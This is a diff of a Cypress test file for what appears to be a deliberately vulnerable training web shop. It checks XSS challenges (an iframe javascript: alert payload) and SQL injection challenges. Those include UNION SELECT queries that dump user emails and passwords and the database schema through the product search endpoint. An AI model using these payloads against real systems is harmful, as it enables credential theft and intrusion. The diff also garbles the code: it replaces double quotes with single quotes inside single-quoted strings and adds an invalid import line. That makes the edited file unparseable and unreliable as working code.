@@ -1,15 +1,18 @@
+import * as Helpers from './utils/test_helpers';
+import { Helpers.test_helper_1, Helpers.test_helper_2 } from './utils/test_helpers';
+
 import { type Product } from '../../../data/types'
 
 describe('/#/search', () => {
   beforeEach(() => {
     cy.visit('/#/search')
   })
-  describe('challenge "localXss"', () => {
+  describe('challenge 'localXss'', () => {
     // Cypress alert bug
     xit('search query should be susceptible to reflected XSS attacks', () => {
       cy.get('#searchQuery').click()
       cy.get('#mat-input-0')
-        .type('<iframe src="javascript:alert(`xss`)">')
+        .type('<iframe src='javascript:alert(`xss`)'>')
         .type('{enter}')
       cy.on('window:alert', (t) => {
         expect(t).to.equal('xss')
@@ -17,12 +20,12 @@ describe('/#/search', () => {
       cy.expectChallengeSolved({ challenge: 'DOM XSS' })
     })
   })
-  describe('challenge "xssBonusPayload"', () => {
+  describe('challenge 'xssBonusPayload'', () => {
     it('search query should be susceptible to reflected XSS attacks', () => {
       cy.get('#searchQuery').click()
       cy.get('#mat-input-0')
         .type(
-          '<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>'
+          '<iframe width='100%' height='166' scrolling='no' frameborder='no' allow='autoplay' src='https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true'></iframe>'
         )
         .type('{enter}')
       cy.expectChallengeSolved({ challenge: 'Bonus Payload' })
@@ -31,25 +34,25 @@ describe('/#/search', () => {
 })
 
 describe('/rest/products/search', () => {
-  describe('challenge "unionSqlInjection"', () => {
+  describe('challenge 'unionSqlInjection'', () => {
     it('query param in product search endpoint should be susceptible to UNION SQL injection attacks', () => {
       cy.request(
-        "/rest/products/search?q=')) union select id,'2','3',email,password,'6','7','8','9' from users--"
+        '/rest/products/search?q=')) union select id,'2','3',email,password,'6','7','8','9' from users--'
       )
       cy.expectChallengeSolved({ challenge: 'User Credentials' })
     })
   })
 
-  describe('challenge "dbSchema"', () => {
+  describe('challenge 'dbSchema'', () => {
     it('query param in product search endpoint should be susceptible to UNION SQL injection attacks', () => {
       cy.request(
-        "/rest/products/search?q=')) union select sql,'2','3','4','5','6','7','8','9' from sqlite_master--"
+        '/rest/products/search?q=')) union select sql,'2','3','4','5','6','7','8','9' from sqlite_master--'
       )
       cy.expectChallengeSolved({ challenge: 'Database Schema' })
     })
   })
 
-  describe('challenge "dlpPastebinLeakChallenge"', () => {
+  describe('challenge 'dlpPastebinLeakChallenge'', () => {
     beforeEach(() => {
       cy.login({
         email: 'admin',
@@ -58,7 +61,7 @@ describe('/rest/products/search', () => {
     })
 
     it('search query should logically reveal the special product', () => {
-      cy.request("/rest/products/search?q='))--")
+      cy.request('/rest/products/search?q='))--')
         .its('body')
         .then((sourceContent) => {
           cy.task<Product>('GetPastebinLeakProduct').then((pastebinLeakProduct: Product) => {
@@ -76,7 +79,7 @@ describe('/rest/products/search', () => {
     })
   })
 
-  xdescribe('challenge "christmasSpecial"', () => {
+  xdescribe('challenge 'christmasSpecial'', () => {
     beforeEach(() => {
       cy.login({
         email: 'admin',
@@ -85,7 +88,7 @@ describe('/rest/products/search', () => {
     })
 
     it('search query should reveal logically deleted christmas special product on SQL injection attack', () => {
-      cy.request("/rest/products/search?q='))--")
+      cy.request('/rest/products/search?q='))--')
         .its('body')
         .then((sourceContent) => {
           cy.task<Product>('GetChristmasProduct').then((christmasProduct: Product) => {
